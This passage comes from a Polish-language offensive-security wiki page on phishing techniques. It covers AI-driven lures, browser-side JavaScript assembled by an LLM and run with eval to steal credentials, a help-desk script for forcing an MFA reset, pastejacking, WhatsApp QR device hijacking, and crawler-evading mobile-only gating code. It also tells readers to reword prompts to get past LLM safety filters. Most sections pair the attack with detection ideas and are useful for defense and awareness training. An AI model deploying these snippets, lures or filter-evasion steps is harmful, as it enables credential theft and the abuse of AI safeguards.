* Zachowuje to elastyczność C2 (serwer może zmieniać zadania bez aktualizowania DLL) i ukrywa okna konsoli. Wyszukuj procesy potomne PowerShell uruchomione przez `rundll32.exe`, w których jednocześnie występują `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Obrońcy mogą szukać połączeń zwrotnych HTTP(S) w formie `...page.php?tynor=<COMPUTER>sss<USER>` oraz interwałów odpytywania wynoszących 5 minut po załadowaniu DLL.

---

## Phishing z użyciem AI
Atakujący łączą obecnie **LLM i API klonowania głosu** w celu tworzenia w pełni spersonalizowanych przynęt i prowadzenia interakcji w czasie rzeczywistym.

| Warstwa | Przykładowe zastosowanie przez threat actor |
|-------|-------------|
|Automatyzacja|Generowanie i wysyłanie ponad 100 tys. wiadomości e-mail / SMS z losowo zmienianym sformułowaniem i linkami śledzącymi.|
|Generative AI|Tworzenie *jednorazowych* wiadomości e-mail odwołujących się do publicznych transakcji M&A i prywatnych żartów z social media; deepfake głosu CEO w oszustwie polegającym na oddzwonieniu.|
|Agentic AI|Autonomiczne rejestrowanie domen, zbieranie informacji z open source intelligence oraz tworzenie wiadomości kolejnego etapu, gdy ofiara kliknie, ale nie prześle danych uwierzytelniających.|

**Obrona:**
• Dodaj **dynamiczne bannery** wyróżniające wiadomości wysłane z niezaufanej automatyzacji (na podstawie anomalii ARC/DKIM).
• Wdróż **frazy wyzwania biometrii głosu** dla żądań telefonicznych o wysokim ryzyku.
• Ciągle symuluj przynęty generowane przez AI w programach podnoszenia świadomości – statyczne szablony są przestarzałe.

Zobacz także – nadużywanie agentic browsing do phishingu danych uwierzytelniających:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz także – nadużywanie AI agent do lokalnych narzędzi CLI i MCP (w celu inwentaryzacji sekretów i wykrywania):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Wspomagane przez LLM składanie phishingowego JavaScript w czasie wykonywania (generowanie kodu w przeglądarce)

Atakujący mogą dostarczyć wyglądający niewinnie HTML i **wygenerować stealera w czasie wykonywania**, prosząc **zaufane API LLM** o JavaScript, a następnie wykonując go w przeglądarce (np. za pomocą `eval` lub dynamicznego `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt jako obfuskacja:** koduj URL-e eksfiltracji i ciągi Base64 w promptcie; iteracyjnie zmieniaj sformułowania, aby omijać filtry bezpieczeństwa i ograniczać halucynacje.
2. **Wywołanie API po stronie klienta:** podczas ładowania JS wywołuje publiczny LLM (Gemini/DeepSeek/itp.) lub proxy CDN; w statycznym HTML znajduje się tylko prompt/wywołanie API.
3. **Złożenie i wykonanie:** połącz odpowiedź i wykonaj ją (polimorficznie przy każdej wizycie):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. parsowanie tokenu LogoKit) i wysyła dane uwierzytelniające do ukrytego w promptcie endpointu.

**Evasion traits**
- Ruch trafia do dobrze znanych domen LLM lub renomowanych proxy CDN; czasami przez WebSockets do backendu.
- Brak statycznego payloadu; złośliwy JS istnieje wyłącznie po renderowaniu.
- Niedeterministyczne generowanie tworzy **unikalne stealery** dla każdej sesji.

**Detection ideas**
- Uruchamiaj sandboxy z włączonym JS; wykrywaj **runtime `eval`/dynamiczne tworzenie skryptów pochodzące z odpowiedzi LLM**.
- Wyszukuj żądania POST z front-endu do API LLM, po których natychmiast następuje `eval`/`Function` na zwróconym tekście.
- Generuj alerty dotyczące niezatwierdzonych domen LLM w ruchu klienckim oraz następujących po nich żądań POST z danymi uwierzytelniającymi.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oprócz klasycznego push-bombingu operatorzy po prostu **wymuszają nową rejestrację MFA** podczas rozmowy z help deskiem, unieważniając istniejący token użytkownika. Każdy kolejny prompt logowania wygląda dla ofiary wiarygodnie.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w ciągu kilku minut z tego samego adresu IP**.



## Przejmowanie schowka / Pastejacking

Atakujący mogą po cichu kopiować złośliwe polecenia do schowka ofiary ze zhakowanej lub typosquatted strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując dowolny kod bez pobierania pliku ani załącznika.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobilny i dystrybucja złośliwych aplikacji (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Przejęcie łączenia urządzenia WhatsApp za pomocą inżynierii społecznej z użyciem kodu QR
* Strona-pułapka (np. fałszywy „kanał” ministerstwa/CERT) wyświetla kod QR WhatsApp Web/Desktop i instruuje ofiarę, aby go zeskanowała, po cichu dodając atakującego jako **połączone urządzenie**.<sup>[[12]](#references)</sup>
* Atakujący natychmiast uzyskuje wgląd w czaty i kontakty, dopóki sesja nie zostanie usunięta. Ofiary mogą później zobaczyć powiadomienie „połączono nowe urządzenie”; obrońcy mogą wyszukiwać nieoczekiwane zdarzenia związane z łączeniem urządzeń, występujące krótko po odwiedzeniu niezaufanych stron z kodami QR.

### Phishing ograniczony do urządzeń mobilnych w celu omijania crawlerów/sandboxów
Operatorzy coraz częściej ograniczają swoje przepływy phishingowe za pomocą prostego sprawdzania urządzenia, aby desktopowe crawlery nigdy nie docierały do stron końcowych. Typowy schemat obejmuje niewielki skrypt, który sprawdza, czy DOM obsługuje dotyk, i wysyła wynik do endpointu serwera; klienci niemobilni otrzymują HTTP 500 (lub pustą stronę), podczas gdy użytkownikom urządzeń mobilnych udostępniany jest pełny przepływ.<sup>[[7]](#references)</sup>

Minimalny fragment po stronie klienta (typowa logika):
```html
<script src="/static/detect_device.js"></script>
```
Logika `detect_device.js` (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Często obserwowane zachowanie serwera:
- Ustawia session cookie podczas pierwszego ładowania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) dla kolejnych żądań GET, gdy `is_mobile=false`; udostępnia phishing tylko wtedy, gdy `true`.

Heurystyki wyszukiwania i detekcji:
- Zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria sieciowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla urządzeń innych niż mobile; prawidłowe ścieżki ofiar korzystających z urządzeń mobile zwracają 200 z następującym HTML/JS.
- Blokuj lub dokładnie analizuj strony, które uzależniają zawartość wyłącznie od `ontouchstart` lub podobnych kontroli urządzenia.

Wskazówki dotyczące obrony:
- Uruchamiaj crawlery z fingerprintami przypominającymi urządzenia mobile i z włączonym JS, aby ujawniać treści objęte ograniczeniami.
- Generuj alerty dla podejrzanych odpowiedzi 500 następujących po `POST /detect` na nowo zarejestrowanych domenach.

## References

- [1] [Generowanie wariantów domen używanych w phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Wykrywanie phishingu: narzędzia i techniki (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kradzież poświadczeń i omijanie 2FA za pomocą noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jak zainstalować i skonfigurować DKIM z Postfix na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globalny raport Unit 42 dotyczący reagowania na incydenty z 2025 r. – edycja poświęcona inżynierii społecznej](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Ciche smishing – infrastruktura phishingowa i heurystyki ograniczone do urządzeń mobile (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Kolejna granica ataków polegających na składaniu w czasie działania: wykorzystanie LLM do generowania JavaScript phishingowego w czasie rzeczywistym](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Podszywanie się, przejmowanie kliknięć i TDS: analiza ekosystemu dystrybucji malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Przejmowanie ruchu do windows.com firmy Microsoft za pomocą bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: fałszywa aplikacja randkowa wykorzystana jako przynęta w ukierunkowanej kampanii spyware w Pakistanie](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC i próbki ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
